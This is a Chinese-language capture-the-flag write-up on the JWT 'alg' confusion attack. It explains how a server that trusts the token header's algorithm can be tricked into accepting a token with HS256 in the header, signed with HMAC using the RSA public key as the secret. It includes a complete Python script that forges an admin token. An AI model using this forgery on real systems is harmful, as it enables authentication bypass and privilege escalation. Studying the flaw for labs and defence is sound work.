## JWT 篡改算法绕过

输入 admin/admin 登录后给出了 JWT 以及一个密钥

![](https://pic1.imgdb.cn/item/6881f38558cb8da5c8d55e35.png)

在 JWT 上解码发现是 RS256 算法

![](https://pic1.imgdb.cn/item/6881f40f58cb8da5c8d56215.png)

题干中提示我们 若使用非对称密码算法时，有时攻击者可以获取到公钥，此时可通过修改 JWT 头部的签名算法，将非对称密码算法改为对称密码算法，从而达到攻击者目的

此时登录后 JWT 中 `payload` 的 `role` 是 `guest`，而只有当 `role` 为 `admin` 时才能够得到 flag

有给出一个公钥

![](https://pic1.imgdb.cn/item/6881f60a58cb8da5c8d56e8e.png)

所以这里就可以尝试更改算法为 `HS256`，以公钥作为密钥来进行签名和验证

JWT 格式是这样的：

```sh
# header：比如 {"alg": "RS256", "typ": "JWT"}
# payload：比如 {"username": "admin", "role": "admin"}
# signature：由前两个部分（header.payload）+ 私钥通过 RS256（即 RSA 签名）生成的签名
header.payload.signature
```

**服务端**根据 JWT 的算法字段（`RS256`）：

- 用“公钥”验证这个签名是否是由私钥生成的
- 如果签名通过验证 → 说明 payload 没被篡改
- 然后读取 payload 判断是否是 `admin` 等

攻击者的目标伪造一个内容为

```json
{
  "username": "root",
  "role": "admin"
}
```

的 JWT，让服务端相信这是真的

但攻击者**没有私钥**，按道理来说无法伪造 RS256 的签名

如果服务端的代码是这样的

```php
$header = JWTHelper::getHeader($token);
$algs = array_merge(array($header->alg, $alg));  // 使用 header 中的 alg！
JWT::decode($token, $key, $algs);               // 不强制算法！
```

这就有问题了，攻击者可以把 header 改成：

```json
{"alg": "HS256", "typ": "JWT"}
```

也就是告诉服务端：“请用 HS256（对称加密）来验证我这个签名”

HS256 是对称加密，**签名和验证都需要一个密钥**。攻击者本来是没有密钥的，但公钥是公开的啊，任何人都能拿到

于是攻击者就这样做了：

1. 改 header 为

```json
{"alg": "HS256", "typ": "JWT"}
```

2. 用 base64 编码 header 和 payload，拼起来

```python
base64url(header) + "." + base64url(payload)
```

3. 用服务端用于验证的“公钥”当作 HMAC 的密钥生成签名

```python
hmac.new(public_key, message, sha256).digest()
```

4. 拼好 JWT 发送给服务端，服务端看到 alg 是 `HS256`，就真的用它手里的“公钥”来验证 HMAC

RSA 公钥是用于验证签名的，而 HMAC 的密钥是用于生成签名的，两者本质不同

但如果服务端代码**没检查 alg 是否非法降级**、**允许使用 HS256**，就会被你这个伪造 token 骗过去！

```python
# 导入必要模块：
# hmac：用于计算消息认证码（MAC）
# hashlib：提供哈希算法（如 SHA-256）
# base64：用于 base64 编码 JWT 的 header 和 payload
import hmac
import hashlib
import base64

key = """-----BEGIN PUBLIC KEY-----
MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAplTDO9hgk4Hm4x3krn9Z
hoYCHwp63E89U92LucW+13kkALbwM2CvoAzW6HvIgxltTYXy8smsAEtYNj/83KBT
qYUQWM9IqrzIscQX0eQ3GokMPQR0R3rZjIp6YmTG6ktqucLwy5Np0zn/S5LpRTzQ
r4UxhIRZfr7lC+B2FlvrqHVPh2ynvpS0vpzmVlS+C4+pJtuXh3Lbg95zWtQB3y/k
sh4xwM7IZyLJRilfkrhr1Q+G68WAVqNuuVswlpM3A79zC4z+npupwBgZrJl6PhZt
hqIRs2JdGWffR0kh/aNkcJmq6HCwHNnG0LjwtQUDEHW6K+4rrw9X2H/qCk2qgcVz
4QIDAQAB
-----END PUBLIC KEY-----
"""

# JWT 头部，声明类型和算法
# 这里将算法设置为 HS256（对称加密），这就是攻击点：将原本应该是 RS256 的非对称算法“降级”为对称算法
header = '{"typ": "JWT", "alg": "HS256"}'

# JWT 负载（Payload），其中包含声明的用户身份和权限
payload = '{"username": "root", "role": "admin"}'

# 对 header 进行 base64 URL 安全编码，并去除填充字符 '='
encodeHBytes = base64.urlsafe_b64encode(header.encode("utf-8"))
encodeHeader = str(encodeHBytes, "utf-8").rstrip("=")

# 对 payload 同样进行 base64 编码处理
encodePBytes = base64.urlsafe_b64encode(payload.encode("utf-8"))
encodePayload = str(encodePBytes, "utf-8").rstrip("=")

# 拼接 header 和 payload 部分（即签名前的 JWT token）
token = (encodeHeader + "." + encodePayload)

# 使用 HMAC-SHA256 对上述 token 进行签名
# ⚠️ 注意：此处错误地使用了“公钥”作为 HMAC 对称密钥，这是攻击者的“降级攻击手法”
# 如果后端未正确限制算法为 RS256，反而接受 HS256 并用 public key 来验证 HMAC，就会被绕过验证
sig = base64.urlsafe_b64encode(
    hmac.new(bytes(key, "UTF-8"), token.encode("utf-8"), hashlib.sha256).digest()
).decode("UTF-8").rstrip("=")

# 输出完整伪造的 JWT token（Header.Payload.Signature）
print(token + "." + sig)
```

成功拿到 flag

![](https://pic1.imgdb.cn/item/6881f8cf58cb8da5c8d57e0f.png)
